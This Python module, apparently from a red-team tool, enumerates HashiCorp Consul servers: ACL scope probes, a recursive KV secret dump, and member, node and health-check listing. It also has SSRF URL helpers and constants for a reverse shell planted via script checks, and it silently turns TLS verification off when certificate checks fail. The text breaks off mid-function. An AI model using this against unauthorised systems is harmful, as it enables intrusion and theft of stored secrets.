"""Consul audit stage."""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import secrets
import shlex
import shutil
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

from .console import Console
from .logger import AttemptLogger
from .utils import collect_scan_ports, collect_scan_targets, utc_now_iso

_CONSUL_TAG = "CONSUL"
_CONSUL_SCOPE_NAMES = ("kv", "services", "agents")
_CONSUL_REVSHELL_CHECK_ID_PREFIX = "rev-rp-"
_CONSUL_REVSHELL_CHECK_INTERVAL_SECONDS = 10
_CONSUL_REVSHELL_CHECK_TIMEOUT_SECONDS = 5
_CONSUL_REVSHELL_MIN_WAIT_SECONDS = 8.0
_CONSUL_REVSHELL_MAX_WAIT_SECONDS = 15.0
_CONSUL_REVSHELL_SCHEDULER_SLACK_SECONDS = 2.0
_CONNECTION_TIMEOUT_PREFIX = "connection timeout"


def _clip(text: str, width: int = 80) -> str:
    if len(text) <= width:
        return text
    if width <= 3:
        return text[:width]
    return text[: width - 3] + "..."


def _retry_delay(attempt_index: int) -> float:
    return min(1.50, 0.20 * (2**attempt_index))


def _friendly_error_text(value: str) -> str:
    text = (value or "").strip()
    if not text:
        return "connection failed"
    if text.startswith("<urlopen error ") and text.endswith(">"):
        text = text[len("<urlopen error ") : -1].strip()

    lower = text.lower()
    if "certificate verify failed" in lower or "self signed certificate" in lower:
        return "tls verification failed (try --insecure or trusted cert)"
    if "wrong version number" in lower or ("ssl" in lower and "http request" in lower):
        return "tls/http protocol mismatch"
    if "connection refused" in lower:
        return "connection refused (service is not listening on target port)"
    if "timed out" in lower or "timeout" in lower:
        return "connection timeout"
    if "name or service not known" in lower or "nodename nor servname provided" in lower:
        return "dns lookup failed"
    if "temporary failure in name resolution" in lower:
        return "dns lookup temporary failure"
    if "no route to host" in lower or "network is unreachable" in lower:
        return "network unreachable"
    if "operation not permitted" in lower:
        return "operation not permitted by local environment"

    match = re.search(r"\[errno\s+(-?\d+)\]\s*(.*)", text, flags=re.IGNORECASE)
    if match:
        errno_num = match.group(1)
        detail = (match.group(2) or "").strip()
        if errno_num in {"61", "111"}:
            return "connection refused (service is not listening on target port)"
        if errno_num in {"60", "110"}:
            return "connection timeout"
        if errno_num in {"8", "-2"}:
            return "dns lookup failed"
        if errno_num in {"65", "101", "113"}:
            return "network unreachable"
        if detail:
            return detail
    return text


def _friendly_error_from_exception(exc: BaseException) -> str:
    if isinstance(exc, urllib.error.URLError):
        reason = exc.reason
        if isinstance(reason, BaseException):
            return _friendly_error_text(str(reason))
        return _friendly_error_text(str(reason or exc))
    if isinstance(exc, TimeoutError):
        return "connection timeout"
    return _friendly_error_text(str(exc))


def _is_connection_timeout_fail_record(record: dict[str, Any]) -> bool:
    if str(record.get("status") or "") != "fail":
        return False
    error_text = str(record.get("error") or "").strip().lower()
    return bool(error_text) and error_text.startswith(_CONNECTION_TIMEOUT_PREFIX)


def _is_tls_verify_error_text(value: str | None) -> bool:
    text = str(value or "").strip().lower()
    return "tls verification failed" in text or "certificate verify failed" in text or "self signed certificate" in text


def _ssl_context(*, use_https: bool, insecure: bool) -> ssl.SSLContext | None:
    if not use_https:
        return None
    if insecure:
        return ssl._create_unverified_context()
    return ssl.create_default_context()


def _consul_headers(token: str | None, username: str | None, password: str | None) -> dict[str, str]:
    headers: dict[str, str] = {}
    if token:
        headers["X-Consul-Token"] = token
    if username is not None or password is not None:
        raw = f"{username or ''}:{password or ''}".encode()
        headers["Authorization"] = "Basic " + base64.b64encode(raw).decode("ascii")
    return headers


def _http_request(
    host: str,
    port: int,
    method: str,
    path: str,
    timeout: float,
    *,
    use_https: bool,
    insecure: bool,
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
) -> tuple[int, bytes, dict[str, str], str | None]:
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{host}:{port}{path}"
    request_headers = {
        "User-Agent": "RedPosture/1.0",
        "Accept": "application/json",
    }
    if headers:
        request_headers.update(headers)
    request = urllib.request.Request(url, data=body, method=method, headers=request_headers)
    try:
        with urllib.request.urlopen(
            request,
            timeout=timeout,
            context=_ssl_context(use_https=use_https, insecure=insecure),
        ) as response:
            status = int(response.status)
            payload = response.read()
            response_headers = {str(k).lower(): str(v) for k, v in response.headers.items()}
            return status, payload, response_headers, None
    except urllib.error.HTTPError as exc:
        payload = exc.read()
        response_headers = {str(k).lower(): str(v) for k, v in exc.headers.items()}
        return int(exc.code), payload, response_headers, None
    except (urllib.error.URLError, OSError, TimeoutError, ValueError) as exc:
        return 0, b"", {}, _friendly_error_from_exception(exc)


def _request_with_tls_fallback(
    host: str,
    port: int,
    method: str,
    path: str,
    timeout: float,
    *,
    use_https: bool,
    insecure: bool,
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
) -> tuple[int, bytes, dict[str, str], str | None, bool, bool]:
    status, payload, resp_headers, error = _http_request(
        host, port, method, path, timeout, use_https=use_https, insecure=insecure, headers=headers, body=body
    )
    if use_https and not insecure and error and _is_tls_verify_error_text(error):
        return _http_request(
            host, port, method, path, timeout, use_https=use_https, insecure=True, headers=headers, body=body
        ) + (True, True)
    return status, payload, resp_headers, error, insecure, False


def _decode_body_text(payload: bytes) -> str:
    return payload.decode("utf-8", errors="replace")


def _parse_json_bytes(payload: bytes) -> Any:
    return json.loads(payload.decode("utf-8", errors="replace"))


def _parse_consul_leader(payload: bytes) -> str | None:
    text = _decode_body_text(payload).strip()
    if not text:
        return None
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        parsed = text
    if isinstance(parsed, str):
        clean = parsed.strip().strip('"')
        return clean or None
    return None


def _looks_like_consul_payload(status: int, payload: bytes) -> bool:
    if status != 200:
        return False
    leader = _parse_consul_leader(payload)
    if leader is None:
        return False
    return ":" in leader or leader == ""


def _consul_get_json_any(
    host: str,
    port: int,
    path: str,
    timeout: float,
    *,
    use_https: bool,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[int, Any, str | None, bool, bool]:
    status, payload, _resp_headers, error, effective_insecure, tls_auto = _request_with_tls_fallback(
        host,
        port,
        "GET",
        path,
        timeout,
        use_https=use_https,
        insecure=insecure,
        headers=headers,
    )
    if error:
        return status, None, error, effective_insecure, tls_auto
    if not payload:
        return status, None, None, effective_insecure, tls_auto
    try:
        return status, _parse_json_bytes(payload), None, effective_insecure, tls_auto
    except json.JSONDecodeError:
        return status, _decode_body_text(payload), None, effective_insecure, tls_auto


def _probe_consul_scheme(
    host: str,
    port: int,
    timeout: float,
) -> tuple[bool, str | None, bool, bool, str | None, str | None]:
    preferred_schemes = ["https", "http"] if port == 8501 else ["http", "https"]
    last_error: str | None = None

    for scheme in preferred_schemes:
        status, payload, _headers, error, effective_insecure, tls_auto = _request_with_tls_fallback(
            host,
            port,
            "GET",
            "/v1/status/leader",
            timeout,
            use_https=(scheme == "https"),
            insecure=False,
        )
        if error:
            last_error = error
            continue
        if _looks_like_consul_payload(status, payload):
            return True, scheme, effective_insecure, tls_auto, _parse_consul_leader(payload), None
        body_text = _decode_body_text(payload).strip()
        if status in {401, 403}:
            if "permission denied" in body_text.lower() or "acl" in body_text.lower():
                return True, scheme, effective_insecure, tls_auto, None, None
        if status not in {404, 400}:
            last_error = f"unexpected status={status}"

    return False, None, False, False, None, last_error or "connection failed"


def _unauthorized_status(status: int) -> bool:
    return status in {401, 403}


def _count_kv_keys(payload: Any) -> int | None:
    if isinstance(payload, list):
        return sum(1 for item in payload if isinstance(item, str))
    return None


def _count_services(payload: Any) -> int | None:
    if isinstance(payload, dict):
        return sum(1 for _ in payload)
    return None


def _count_agents(payload: Any) -> int | None:
    if isinstance(payload, list):
        return sum(1 for item in payload if isinstance(item, dict))
    return None


def _count_health_checks(payload: Any) -> int | None:
    if isinstance(payload, list):
        return sum(1 for item in payload if isinstance(item, dict))
    return None


def _scope_probe(
    host: str,
    port: int,
    path: str,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
    count_fn: Callable[[Any], int | None],
) -> dict[str, Any]:
    status, payload, error, effective_insecure, tls_auto = _consul_get_json_any(
        host,
        port,
        path,
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    result: dict[str, Any] = {
        "status": status,
        "ok": False,
        "count": None,
        "error": None,
        "tls_auto_insecure": tls_auto,
        "insecure_effective": effective_insecure,
    }
    if error:
        result["error"] = error
        return result
    if status == 200:
        result["ok"] = True
        result["count"] = count_fn(payload)
        return result
    if _unauthorized_status(status):
        result["error"] = "Unauthorized" if status == 401 else "Forbidden"
        return result
    body_text = _clip(str(payload or ""), 120)
    result["error"] = body_text or f"unexpected status={status}"
    return result


def _extract_consul_version(agent_self_payload: Any) -> str | None:
    if not isinstance(agent_self_payload, dict):
        return None
    for top_key in ("Config", "DebugConfig"):
        section = agent_self_payload.get(top_key)
        if isinstance(section, dict):
            for ver_key in ("Version", "version"):
                raw = section.get(ver_key)
                if isinstance(raw, str) and raw.strip():
                    return raw.strip()
    return None


def _find_bool_recursive(value: Any, key: str) -> bool | None:
    target = key.lower()
    if isinstance(value, dict):
        for k, v in value.items():
            if str(k).lower() == target:
                if isinstance(v, bool):
                    return v
                if isinstance(v, str):
                    lower_v = v.strip().lower()
                    if lower_v in {"true", "false"}:
                        return lower_v == "true"
            found = _find_bool_recursive(v, key)
            if found is not None:
                return found
    elif isinstance(value, list):
        for item in value:
            found = _find_bool_recursive(item, key)
            if found is not None:
                return found
    return None


def _extract_script_check_flags(agent_self_payload: Any) -> tuple[bool | None, bool | None]:
    local = _find_bool_recursive(agent_self_payload, "EnableLocalScriptChecks")
    remote = _find_bool_recursive(agent_self_payload, "EnableRemoteScriptChecks")
    return local, remote


def _agent_self_probe(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    status, payload, error, effective_insecure, tls_auto = _consul_get_json_any(
        host,
        port,
        "/v1/agent/self",
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    result: dict[str, Any] = {
        "status": status,
        "ok": False,
        "error": None,
        "version": None,
        "local_script_checks": None,
        "remote_script_checks": None,
        "payload": payload if isinstance(payload, dict) else None,
        "tls_auto_insecure": tls_auto,
        "insecure_effective": effective_insecure,
    }
    if error:
        result["error"] = error
        return result
    if status != 200 or not isinstance(payload, dict):
        if _unauthorized_status(status):
            result["error"] = "Unauthorized" if status == 401 else "Forbidden"
        else:
            result["error"] = f"unexpected status={status}"
        return result
    result["ok"] = True
    result["version"] = _extract_consul_version(payload)
    local, remote = _extract_script_check_flags(payload)
    result["local_script_checks"] = local
    result["remote_script_checks"] = remote
    return result


def _consul_access_matrix(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> dict[str, Any]:
    probes = {
        "kv": _scope_probe(
            host,
            port,
            "/v1/kv/?keys&recurse",
            timeout,
            scheme=scheme,
            insecure=insecure,
            headers=headers,
            count_fn=_count_kv_keys,
        ),
        "services": _scope_probe(
            host,
            port,
            "/v1/catalog/services",
            timeout,
            scheme=scheme,
            insecure=insecure,
            headers=headers,
            count_fn=_count_services,
        ),
        "agents": _scope_probe(
            host,
            port,
            "/v1/agent/members",
            timeout,
            scheme=scheme,
            insecure=insecure,
            headers=headers,
            count_fn=_count_agents,
        ),
    }
    return probes


def _all_scopes_ok(scopes: dict[str, Any]) -> bool:
    return all(bool((scopes.get(name) or {}).get("ok")) for name in _CONSUL_SCOPE_NAMES)


def _no_scopes_ok(scopes: dict[str, Any]) -> bool:
    return all(not bool((scopes.get(name) or {}).get("ok")) for name in _CONSUL_SCOPE_NAMES)


def _scope_counts_suffix(scopes: dict[str, Any]) -> str:
    parts: list[str] = []
    for name in _CONSUL_SCOPE_NAMES:
        entry = scopes.get(name) or {}
        count = entry.get("count")
        if isinstance(count, int):
            parts.append(f"({name}:{count})")
        else:
            parts.append(f"({name}:-)")
    return " ".join(parts)


def _all_scope_counts_zero(scopes: dict[str, Any]) -> bool:
    for name in _CONSUL_SCOPE_NAMES:
        entry = scopes.get(name) or {}
        count = entry.get("count")
        if not isinstance(count, int) or count != 0:
            return False
    return True


def _anonymous_acl_denied_with_filtered_empty(record: dict[str, Any], scopes: dict[str, Any]) -> bool:
    anon_self_ok = record.get("anonymous_self_ok")
    anon_self_error = str(record.get("anonymous_self_error") or "").strip().lower()
    if anon_self_ok is not False:
        return False
    if not anon_self_error:
        return False
    if not any(token in anon_self_error for token in ("permission denied", "forbidden", "unauthorized")):
        return False
    return _all_scope_counts_zero(scopes)


def _scope_bools_suffix(scopes: dict[str, Any]) -> str:
    parts: list[str] = []
    for name in _CONSUL_SCOPE_NAMES:
        entry = scopes.get(name) or {}
        parts.append(f"({name}:{bool(entry.get('ok'))})")
    return " ".join(parts)


def _scope_status_detail_lines(prefix: str, scopes: dict[str, Any]) -> list[str]:
    lines: list[str] = []
    for name in _CONSUL_SCOPE_NAMES:
        entry = scopes.get(name) or {}
        if bool(entry.get("ok")):
            continue
        error = str(entry.get("error") or "").strip()
        status = entry.get("status")
        if error:
            if isinstance(status, int) and status > 0:
                lines.append(f"{prefix} {name} err={_clip(error, 96)} status={status}")
            else:
                lines.append(f"{prefix} {name} err={_clip(error, 96)}")
    return lines


def _bool_text(value: bool | None) -> str:
    if value is True:
        return "True"
    if value is False:
        return "False"
    return "unknown"


# ──────────────────────────────── SSRF (оригинал без изменений) ────────────────────────────────


def _normalize_ssrf_path(path_str: str | None) -> tuple[str, str] | None:
    raw = (path_str or "").strip()
    if not raw:
        return None
    parsed_query = ""
    parsed_path = raw
    if "://" in raw:
        try:
            parsed = urllib.parse.urlsplit(raw)
        except ValueError:
            return None
        parsed_path = parsed.path or "/"
        parsed_query = parsed.query
    else:
        if "?" in raw:
            parsed_path, parsed_query = raw.split("?", 1)
        else:
            parsed_path, parsed_query = raw, ""
    parsed_path = parsed_path.strip() or "/"
    if not parsed_path.startswith("/"):
        parsed_path = f"/{parsed_path}"
    return parsed_path, parsed_query


def _normalize_ssrf_urls(targets_str: str | None, ports_str: str | None, path_str: str | None = None) -> list[str]:
    if not targets_str:
        return []
    raw_targets = [t.strip() for t in str(targets_str).split(",") if t.strip()]
    if not raw_targets:
        return []
    parsed_ports: list[int] = []
    if ports_str:
        parsed_ports = collect_scan_ports(ports_str)
        if not parsed_ports:
            return []
    path_override = _normalize_ssrf_path(path_str)
    if path_str and path_override is None:
        return []
    results: list[str] = []
    seen: set[str] = set()
    for target in raw_targets:
        candidate_urls: list[str] = []
        if "://" not in target and "/" in target:
            try:
                expanded_hosts = collect_scan_targets(target, max_network_hosts=256)
            except (OSError, ValueError):
                expanded_hosts = []
            if expanded_hosts:
                for host in expanded_hosts:
                    if ":" in host and not host.startswith("["):
                        candidate_urls.append(f"http://[{host}]")
                    else:
                        candidate_urls.append(f"http://{host}")
        if not candidate_urls:
            candidate_urls = [target if "://" in target else f"http://{target}"]
        for candidate in candidate_urls:
            try:
                parsed = urllib.parse.urlsplit(candidate)
            except ValueError:
                continue
            scheme = parsed.scheme.lower() or "http"
            if scheme not in {"http", "https"}:
                scheme = "http"
            host = parsed.hostname
            if not host:
                continue
            path = parsed.path or "/"
            query = parsed.query
            if path_override is not None:
                path, query = path_override
            if parsed_ports:
                ports_for_target = parsed_ports
            elif parsed.port is not None:
                ports_for_target = [parsed.port]
            else:
                ports_for_target = [443 if scheme == "https" else 80]
            for port_int in ports_for_target:
                netloc = f"[{host}]" if ":" in host and not host.startswith("[") else host
                netloc += f":{port_int}"
                normalized = urllib.parse.urlunsplit((scheme, netloc, path, query, ""))
                if normalized in seen:
                    continue
                seen.add(normalized)
                results.append(normalized)
    return results


def _consul_put_json(
    host: str,
    port: int,
    path: str,
    timeout: float,
    payload: dict[str, Any],
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[int, Any, str | None]:
    body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    merged_headers = {"Content-Type": "application/json"}
    if headers:
        merged_headers.update(headers)
    status, raw, _resp_headers, error, _insecure_eff, _tls_auto = _request_with_tls_fallback(
        host,
        port,
        "PUT",
        path,
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=merged_headers,
        body=body,
    )
    if error:
        return status, None, error
    if not raw:
        return status, None, None
    try:
        return status, _parse_json_bytes(raw), None
    except json.JSONDecodeError:
        return status, _decode_body_text(raw), None


def _consul_put_no_body(
    host: str,
    port: int,
    path: str,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[int, str | None]:
    status, payload, _resp_headers, error, _insecure_eff, _tls_auto = _request_with_tls_fallback(
        host,
        port,
        "PUT",
        path,
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return status, error
    if status in {200, 204}:
        return status, None
    body_text = _decode_body_text(payload).strip()
    return status, body_text or f"unexpected status={status}"


def _consul_get_checks(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[int, dict[str, Any] | None, str | None]:
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        "/v1/agent/checks",
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return status, None, error
    if status != 200:
        return status, None, f"status={status}"
    if not isinstance(payload, dict):
        return status, None, "invalid checks response"
    return status, payload, None


def _json_compact(value: Any) -> str:
    return json.dumps(value, ensure_ascii=False, separators=(",", ":"))


def _consul_check_script_display(script_value: str | None, args: list[str] | None) -> str | None:
    script_text = str(script_value or "").strip()
    if script_text:
        return script_text
    if not isinstance(args, list):
        return None
    args_text = [str(item or "").strip() for item in args if str(item or "").strip()]
    if not args_text:
        return None
    try:
        joined = shlex.join(args_text)
    except Exception:
        joined = " ".join(args_text)
    return f"<from args> {joined}"


def _consul_agent_checks_list(checks_payload: dict[str, Any]) -> list[dict[str, Any]]:
    def _text_from_entry(entry: dict[str, Any], *keys: str) -> str | None:
        for key in keys:
            value = entry.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
        definition = entry.get("Definition")
        if isinstance(definition, dict):
            for key in keys:
                value = definition.get(key)
                if isinstance(value, str) and value.strip():
                    return value.strip()
        return None

    def _enterprise_text_from_entry(entry: dict[str, Any], key: str) -> str | None:
        value = entry.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip()
        enterprise_meta = entry.get("EnterpriseMeta")
        if isinstance(enterprise_meta, dict):
            raw = enterprise_meta.get(key)
            if isinstance(raw, str) and raw.strip():
                return raw.strip()
        definition = entry.get("Definition")
        if isinstance(definition, dict):
            raw = definition.get(key)
            if isinstance(raw, str) and raw.strip():
                return raw.strip()
            enterprise_meta = definition.get("EnterpriseMeta")
            if isinstance(enterprise_meta, dict):
                nested_raw = enterprise_meta.get(key)
                if isinstance(nested_raw, str) and nested_raw.strip():
                    return nested_raw.strip()
        return None

    def _args_from_entry(entry: dict[str, Any]) -> list[str]:
        raw = entry.get("Args")
        if not isinstance(raw, list):
            definition = entry.get("Definition")
            raw = definition.get("Args") if isinstance(definition, dict) else None
        if not isinstance(raw, list):
            return []
        out: list[str] = []
        for item in raw:
            text = str(item or "").strip()
            if text:
                out.append(text)
        return out

    items: list[dict[str, Any]] = []
    for check_id, raw_entry in sorted(checks_payload.items(), key=lambda item: str(item[0])):
        if not isinstance(raw_entry, dict):
            continue
        raw_definition = raw_entry.get("Definition")
        definition_json: str | None = None
        if isinstance(raw_definition, (dict, list)):
            try:
                definition_json = _json_compact(raw_definition)
            except (TypeError, ValueError):
                definition_json = str(raw_definition)
        args = _args_from_entry(raw_entry)
        script_text = _consul_check_script_display(_text_from_entry(raw_entry, "Script"), args)
        item = {
            "check_id": str(check_id).strip() or "-",
            "name": str(raw_entry.get("Name") or "").strip() or "-",
            "status": str(raw_entry.get("Status") or "").strip() or "-",
            "service_id": str(raw_entry.get("ServiceID") or "").strip() or None,
            "notes": str(raw_entry.get("Notes") or "").strip() or None,
            "output": str(raw_entry.get("Output") or "").strip() or None,
            "args": args,
            "script": script_text,
            "type": _text_from_entry(raw_entry, "Type"),
            "http": _text_from_entry(raw_entry, "HTTP", "Http"),
            "tcp": _text_from_entry(raw_entry, "TCP", "Tcp"),
            "grpc": _text_from_entry(raw_entry, "GRPC", "Grpc"),
            "method": _text_from_entry(raw_entry, "Method"),
            "interval": _text_from_entry(raw_entry, "Interval"),
            "timeout": _text_from_entry(raw_entry, "Timeout"),
            "ttl": _text_from_entry(raw_entry, "TTL", "Ttl"),
            "deregister_after": _text_from_entry(raw_entry, "DeregisterCriticalServiceAfter"),
            "namespace": _enterprise_text_from_entry(raw_entry, "Namespace"),
            "partition": _enterprise_text_from_entry(raw_entry, "Partition"),
        }
        if definition_json:
            item["definition_raw"] = definition_json
        items.append(item)
    return items


def _consul_catalog_services_list(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[list[dict[str, Any]] | None, str | None]:
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        "/v1/catalog/services",
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return None, error
    if status != 200:
        if _unauthorized_status(status):
            return None, "Unauthorized" if status == 401 else "Forbidden"
        return None, f"status={status}"
    if not isinstance(payload, dict):
        return None, "invalid services response"

    items: list[dict[str, Any]] = []
    for name in sorted(payload.keys(), key=lambda v: str(v).lower()):
        tags_raw = payload.get(name)
        tags: list[str] = []
        if isinstance(tags_raw, list):
            for tag in tags_raw:
                tag_text = str(tag or "").strip()
                if tag_text:
                    tags.append(tag_text)
        service_name = str(name or "").strip()
        if not service_name:
            continue
        items.append(
            {
                "name": service_name,
                "tags": tags,
            }
        )
    return items, None


def _normalize_inline_text(value: str) -> str:
    return " ".join(str(value or "").split())


def _decode_consul_kv_value(raw_value: Any) -> str:
    if raw_value is None:
        return ""
    if not isinstance(raw_value, str):
        return _normalize_inline_text(str(raw_value))
    if not raw_value:
        return ""
    try:
        decoded = base64.b64decode(raw_value.encode("ascii"), validate=False)
    except (ValueError, TypeError):
        return _normalize_inline_text(raw_value)
    return _normalize_inline_text(decoded.decode("utf-8", errors="replace"))


def _consul_kv_keys_list(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[list[str] | None, str | None]:
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        "/v1/kv/?keys&recurse",
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return None, error
    if status != 200:
        if _unauthorized_status(status):
            return None, "Unauthorized" if status == 401 else "Forbidden"
        return None, f"status={status}"
    if not isinstance(payload, list):
        return None, "invalid kv keys response"
    items = [str(item).strip() for item in payload if str(item).strip()]
    return sorted(items, key=str.lower), None


def _consul_kv_dump(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
    key_name: str | None = None,
) -> tuple[list[dict[str, Any]] | None, str | None]:
    if key_name:
        key_path = f"/v1/kv/{urllib.parse.quote(key_name, safe='/')}"
    else:
        key_path = "/v1/kv/?recurse"
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        key_path,
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return None, error
    if status == 404 and key_name:
        return [], None
    if status != 200:
        if _unauthorized_status(status):
            return None, "Unauthorized" if status == 401 else "Forbidden"
        return None, f"status={status}"
    if not isinstance(payload, list):
        return None, "invalid kv dump response"

    items: list[dict[str, Any]] = []
    for entry in payload:
        if not isinstance(entry, dict):
            continue
        key = str(entry.get("Key") or "").strip()
        if not key:
            continue
        items.append(
            {
                "key": key,
                "value": _decode_consul_kv_value(entry.get("Value")),
                "flags": entry.get("Flags"),
                "modify_index": entry.get("ModifyIndex"),
            }
        )
    items.sort(key=lambda item: str(item.get("key") or "").lower())
    return items, None


def _consul_agent_members_list(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[list[dict[str, Any]] | None, str | None]:
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        "/v1/agent/members",
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return None, error
    if status != 200:
        if _unauthorized_status(status):
            return None, "Unauthorized" if status == 401 else "Forbidden"
        return None, f"status={status}"
    if not isinstance(payload, list):
        return None, "invalid agent members response"

    items: list[dict[str, Any]] = []
    for entry in payload:
        if not isinstance(entry, dict):
            continue
        tags = entry.get("Tags") if isinstance(entry.get("Tags"), dict) else {}
        name = str(entry.get("Name") or "").strip()
        if not name:
            continue
        items.append(
            {
                "name": name,
                "addr": str(entry.get("Addr") or "").strip() or None,
                "port": entry.get("Port"),
                "status": entry.get("Status"),
                "role": str(tags.get("role") or "").strip() or None,
                "dc": str(tags.get("dc") or "").strip() or None,
            }
        )
    items.sort(key=lambda item: str(item.get("name") or "").lower())
    return items, None


def _consul_catalog_nodes_list(
    host: str,
    port: int,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
) -> tuple[list[dict[str, Any]] | None, str | None]:
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        "/v1/catalog/nodes",
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return None, error
    if status != 200:
        if _unauthorized_status(status):
            return None, "Unauthorized" if status == 401 else "Forbidden"
        return None, f"status={status}"
    if not isinstance(payload, list):
        return None, "invalid catalog nodes response"

    items: list[dict[str, Any]] = []
    for entry in payload:
        if not isinstance(entry, dict):
            continue
        name = str(entry.get("Node") or "").strip()
        if not name:
            continue
        items.append(
            {
                "name": name,
                "address": str(entry.get("Address") or "").strip() or None,
                "datacenter": str(entry.get("Datacenter") or "").strip() or None,
            }
        )
    items.sort(key=lambda item: str(item.get("name") or "").lower())
    return items, None


def _consul_health_service_instances(
    host: str,
    port: int,
    service_name: str,
    timeout: float,
    *,
    scheme: str,
    insecure: bool,
    headers: dict[str, str] | None = None,
    agent_checks: dict[str, Any] | None = None,
) -> tuple[list[dict[str, Any]] | None, str | None]:
    path = f"/v1/health/service/{urllib.parse.quote(service_name, safe='')}"
    status, payload, error, _eff_insecure, _tls_auto = _consul_get_json_any(
        host,
        port,
        path,
        timeout,
        use_https=(scheme == "https"),
        insecure=insecure,
        headers=headers,
    )
    if error:
        return None, error
    if status != 200:
        if _unauthorized_status(status):
            return None, "Unauthorized" if status == 401 else "Forbidden"
        return None, f"status={status}"
    if not isinstance(payload, list):
        return None, "invalid health service response"

    def _check_text(*objs: Any, keys: tuple[str, ...]) -> str | None:
        for obj in objs:
            if not isinstance(obj, dict):
                continue
            for key in keys:
                value = obj.get(key)
                if isinstance(value, str) and value.strip():
                    return value.strip()
            definition = obj.get("Definition")
            if isinstance(definition, dict):
                for key in keys:
                    value = definition.get(key)
                    if isinstance(value, str) and value.strip():
                        return value.strip()
        return None

    def _check_enterprise_text(*objs: Any, key: str) -> str | None:
        for obj in objs:
            if not isinstance(obj, dict):
                continue
            value = obj.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
            enterprise_meta = obj.get("EnterpriseMeta")
            if isinstance(enterprise_meta, dict):
                raw = enterprise_meta.get(key)
                if isinstance(raw, str) and raw.strip():
                    return raw.strip()
            definition = obj.get("Definition")
            if isinstance(definition, dict):
                raw = definition.get(key)
                if isinstance(raw, str) and raw.strip():
                    return raw.strip()
                enterprise_meta = definition.get("EnterpriseMeta")
                if isinstance(enterprise_meta, dict):
                    nested_raw = enterprise_meta.get(key)
                    if isinstance(nested_raw, str) and nested_raw.strip():
                        return nested_raw.strip()
        return None

    def _check_args(*objs: Any) -> list[str]:
        for obj in objs:
            if not isinstance(obj, dict):
                continue
            raw = obj.get("Args")
            if not isinstance(raw, list):
                definition = obj.get("Definition")
                raw = definition.get("Args") if isinstance(definition, dict) else None
            if not isinstance(raw, list):
                continue
            out: list[str] = []
            for item in raw:
                item_text = str(item or "").strip()
                if item_text:
                    out.append(item_text)
            if out:
                return out
        return []

    def _check_definition_json(*objs: Any) -> str | None:
        for obj in objs:
            if not isinstance(obj, dict):
                continue
            definition = obj.get("Definition")
            if isinstance(definition, (dict, list)):
                try:
                    return _json_compact(definition)
                except (TypeError, ValueError):
                    return str(definition)
        return None

    instances: list[dict[str, Any]] = []
    for entry in payload:
        if not isinstance(entry, dict):
            continue
        node_obj = entry.get("Node") if isinstance(entry.get("Node"), dict) else {}
        service_obj = entry.get("Service") if isinstance(entry.get("Service"), dict) else {}
        checks_obj = entry.get("Checks") if isinstance(entry.get("Checks"), list) else []

        node_name = str(node_obj.get("Node") or "").strip() or "-"
        node_addr = str(node_obj.get("Address") or "").strip() or "-"
        node_dc = str(node_obj.get("Datacenter") or "").strip() or "-"
        svc_id = str(service_obj.get("ID") or "").strip() or "-"
        svc_addr = str(service_obj.get("Address") or service_obj.get("ServiceAddress") or "").strip() or "-"
        svc_port_raw = service_obj.get("Port")
        try:
            svc_port = int(svc_port_raw) if svc_port_raw is not None else None
        except (TypeError, ValueError):
            svc_port = None
        svc_meta = service_obj.get("Meta") if isinstance(service_obj.get("Meta"), dict) else {}

